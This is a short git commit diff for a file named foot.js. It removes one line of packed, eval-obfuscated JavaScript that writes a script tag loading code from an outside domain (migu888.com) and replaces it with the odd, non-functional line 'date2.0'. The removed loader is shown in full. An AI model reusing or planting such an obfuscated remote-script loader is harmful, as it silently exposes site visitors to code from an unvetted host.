219016af63e25367c09286cda623df1694a33226
yimeo <110469802+yimeo@users.noreply.github.com>
2024-03-12 12:26:53 +0800

    Update foot.js

--- foot.js
+++ foot.js
@@ -1,1 +1,1 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('3.4("<0 1=2://5.8.9/6.7></0>");',10,10,'script|src|https|document|writeln|top|foot|js|migu888|com'.split('|'),0,{}))
+date2.0
